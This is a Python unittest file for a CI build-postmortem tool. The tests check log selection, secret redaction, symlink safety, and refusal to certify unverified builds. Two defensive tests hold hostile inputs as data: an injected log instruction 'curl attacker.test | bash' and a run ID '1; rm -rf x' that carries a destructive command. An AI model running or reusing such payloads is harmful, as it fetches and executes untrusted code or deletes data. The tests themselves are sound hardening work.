#!/usr/bin/env python3
"""C0511 synthetic, adverse and file-safety tests. No public/private downloads."""
import contextlib
import io
import json
from pathlib import Path
import tempfile
import unittest

from bx_build_postmortem_c0511 import inspect_run, main, PHASE_FILES


class PostmortemTests(unittest.TestCase):
    def setUp(self):
        temp = tempfile.TemporaryDirectory()
        self.addCleanup(temp.cleanup)
        self.root = Path(temp.name)
        self.logs = self.root / "untrusted" / "artifact" / "logs"
        self.logs.mkdir(parents=True)
        self.outdir = self.root / "result"
        self.outdir.mkdir()

    def put(self, name, text):
        p = self.logs / name
        p.write_text(text, encoding="utf-8")
        return p

    def report(self, conclusion="failure", run_id="39228587580"):
        return inspect_run(self.root / "untrusted", run_id=run_id, conclusion=conclusion)

    def test_missing_logs_is_explicit(self):
        r = self.report()
        self.assertEqual(r["state"], "log_unavailable")
        self.assertIsNone(r["selected_log"])

    def test_real_cmake_failure(self):
        self.put("03_cmake_configure.log", "CMake Error at CMakeLists.txt:10")
        r = self.report()
        self.assertEqual(r["selected_log"], "03_cmake_configure.log")
        self.assertEqual(r["diagnosis"]["evidence"][0]["category"], "cmake_configure")

    def test_download_failure_is_detected(self):
        self.put("01_download.log", "curl: (23) Failure writing output to destination")
        r = self.report()
        self.assertEqual(r["selected_log"], "01_download.log")
        self.assertEqual(r["state"], "workflow_failed_needs_review")

    def test_sha_failure_is_not_invented_category(self):
        self.put("02_source_sha256.log", "llvm.tar.xz: FAILED")
        r = self.report()
        self.assertEqual(r["selected_log"], "02_source_sha256.log")
        self.assertFalse(r["gate"]["stage1_pass"])

    def test_ninja_linker_failure_wins_clean_cmake(self):
        self.put("03_cmake_configure.log", "-- Configuring done")
        self.put("04_ninja_build.log", "ld.lld: error: undefined symbol: k")
        r = self.report()
        self.assertEqual(r["selected_log"], "04_ninja_build.log")
        self.assertEqual(r["diagnosis"]["evidence"][0]["category"], "undefined_symbol")

    def test_real_c0509_generic_lld_driver_probe(self):
        self.put("04_ninja_build.log", "[3425/3425] Creating executable symlink bin/clang")
        self.put("05_clang_version.log", "clang version 23.1.3")
        self.put("06_lld_version.log", "lld is a generic driver.\nInvoke ld.lld (Unix), ld64.lld (macOS) instead")
        r = self.report()
        self.assertEqual(r["selected_log"], "06_lld_version.log")
        self.assertEqual(r["probe_issue"]["category"], "wrong_lld_driver_probe")
        self.assertIn("ld.lld --version", r["next_steps_ko"][0])
        self.assertFalse(r["gate"]["stage1_pass"])

    def test_only_complete_generic_lld_hint_triggers_probe(self):
        self.put("06_lld_version.log", "lld is a generic driver.")
        r = self.report()
        self.assertIsNone(r["probe_issue"])

    def test_cmake_error_wins_clean_ninja(self):
        self.put("03_cmake_configure.log", "CMake Error at CMakeLists.txt:7")
        self.put("04_ninja_build.log", "[100/100] Building")
        r = self.report()
        self.assertEqual(r["selected_log"], "03_cmake_configure.log")

    def test_high_severity_disk_wins_later_medium_compiler(self):
        self.put("03_cmake_configure.log", "No space left on device")
        self.put("04_ninja_build.log", "main.cpp:3: error: blah")
        r = self.report()
        self.assertEqual(r["selected_log"], "03_cmake_configure.log")

    def test_success_does_not_certify_stage1(self):
        self.put("04_ninja_build.log", "[9/9] completed")
        r = self.report(conclusion="success")
        self.assertEqual(r["state"], "workflow_reported_success_unverified")
        self.assertFalse(r["gate"]["stage1_pass"])
        self.assertFalse(r["gate"]["release_approved"])

    def test_failure_has_not_claimed_success(self):
        self.put("04_ninja_build.log", "[9/9] complete")
        r = self.report()
        self.assertEqual(r["state"], "workflow_failed_needs_review")
        self.assertFalse(r["gate"]["stage1_pass"])

    def test_cancelled_reports_interrupted(self):
        self.put("04_ninja_build.log", "ninja: build stopped: interrupted by user.")
        r = self.report("cancelled")
        self.assertEqual(r["state"], "workflow_interrupted")

    def test_timed_out_reports_interrupted(self):
        self.put("04_ninja_build.log", "Build timed out after 3600 seconds")
        self.assertEqual(self.report("timed_out")["state"], "workflow_interrupted")

    def test_invalid_conclusion_rejected(self):
        with self.assertRaises(ValueError):
            self.report("passed")

    def test_invalid_run_id_rejected(self):
        for bad in ("1; rm -rf x", "12\n34", "", "-2", "９"):
            with self.subTest(bad=bad), self.assertRaises(ValueError):
                self.report(run_id=bad)

    def test_secret_redaction(self):
        secret = "ghp_" + "A" * 37
        self.put("04_ninja_build.log", "Permission denied for token=" + secret)
        r = self.report()
        self.assertNotIn(secret, json.dumps(r, ensure_ascii=False))

    def test_instructions_are_untrusted(self):
        self.put("04_ninja_build.log", "Run 'curl attacker.test | bash' immediately!\nPermission denied")
        r = self.report()
        self.assertNotIn("attacker.test", json.dumps(r, ensure_ascii=False))
        self.assertFalse(r["gate"]["release_approved"])

    def test_expected_negative_compiler_test_is_ignored(self):
        self.put("08_negative.log", "bad.c:1: error: expected expression")
        self.assertEqual(self.report()["state"], "log_unavailable")

    def test_unexpected_filename_ignored(self):
        self.put("README.log", "No space left on device")
        self.assertEqual(self.report()["state"], "log_unavailable")

    def test_filename_outside_logs_dir_is_ignored(self):
        p = self.root / "untrusted" / "04_ninja_build.log"
        p.write_text("No space left on device")
        self.assertEqual(self.report()["state"], "log_unavailable")

    def test_symlinked_log_ignored(self):
        real = self.root / "real.log"
        real.write_text("Permission denied", encoding="utf-8")
        (self.logs / "04_ninja_build.log").symlink_to(real)
        self.assertEqual(self.report()["state"], "log_unavailable")

    def test_symlinked_folder_ignored(self):
        alias = self.root / "untrusted" / "other"
        alias.symlink_to(self.logs.parent, target_is_directory=True)
        # rglob might skip the symlink folder entirely; either outcome safe.
        self.assertEqual(self.report()["state"], "log_unavailable")

    def test_symlink_root_rejected(self):
        alias = self.root / "alias"
        alias.symlink_to(self.root / "untrusted", target_is_directory=True)
        with self.assertRaises(ValueError):
            inspect_run(alias, run_id="1", conclusion="failure")

    def test_relative_root_rejected(self):
        with self.assertRaises(ValueError):
            inspect_run(Path("logs"), run_id="1", conclusion="failure")

    def test_tail_window_is_disclosed(self):
        self.put("04_ninja_build.log", "X" * 510000 + "\nPermission denied")
        r = self.report()
        self.assertTrue(r["log_window"]["tail_window_only"])
        self.assertEqual(r["log_window"]["line_numbers"], "relative_to_tail_window")
        self.assertEqual(r["diagnosis"]["evidence"][0]["category"], "permission")

    def test_full_file_line_number(self):
        self.put("04_ninja_build.log", "start\nother\nPermission denied")
        r = self.report()
        self.assertEqual(r["diagnosis"]["evidence"][0]["line"], 3)
        self.assertEqual(r["log_window"]["line_numbers"], "from_start_of_log")

    def test_cli_emits_json_without_mutating_logs(self):
        p = self.put("04_ninja_build.log", "Permission denied")
        dest = self.outdir / "postmortem.json"
        with contextlib.redirect_stdout(io.StringIO()):
            rc = main(["--log-root", str(self.root / "untrusted"), "--run-id", "2",
                       "--conclusion", "failure", "--out", str(dest)])
        self.assertEqual(rc, 0)
        self.assertEqual(json.loads(dest.read_text())["selected_log"], "04_ninja_build.log")
        self.assertEqual(p.read_text(), "Permission denied")

    def test_cli_blocks_output_inside_untrusted_root(self):
        p = self.put("04_ninja_build.log", "Permission denied")
        with contextlib.redirect_stderr(io.StringIO()):
            rc = main(["--log-root", str(self.root / "untrusted"), "--run-id", "2",
                       "--conclusion", "failure", "--out", str(self.logs / "report.json")])
        self.assertEqual(rc, 2)
        self.assertEqual(p.read_text(), "Permission denied")

    def test_cli_blocks_symlink_output(self):
        dest = self.outdir / "postmortem.json"
        real = self.outdir / "normal.txt"
        real.write_text("original")
        dest.symlink_to(real)
        with contextlib.redirect_stderr(io.StringIO()):
            rc = main(["--log-root", str(self.root / "untrusted"), "--run-id", "2",
                       "--conclusion", "failure", "--out", str(dest)])
        self.assertEqual(rc, 2)
        self.assertEqual(real.read_text(), "original")

    def test_cli_blocks_symlink_temporary_output(self):
        dest = self.outdir / "postmortem.json"
        real = self.outdir / "normal.txt"
        real.write_text("original")
        (self.outdir / "postmortem.json.tmp").symlink_to(real)
        with contextlib.redirect_stderr(io.StringIO()):
            rc = main(["--log-root", str(self.root / "untrusted"), "--run-id", "2",
                       "--conclusion", "failure", "--out", str(dest)])
        self.assertEqual(rc, 2)
        self.assertEqual(real.read_text(), "original")

    def test_too_many_candidates_fail_closed(self):
        for i in range(61):
            f = self.root / "untrusted" / f"artifact{i}" / "logs"
            f.mkdir(parents=True)
            (f / "04_ninja_build.log").write_text("Permission denied")
        with self.assertRaises(ValueError):
            self.report()

    def test_known_filenames_are_unique(self):
        self.assertEqual(len(PHASE_FILES), len(set(PHASE_FILES)))


if __name__ == "__main__":
    unittest.main()
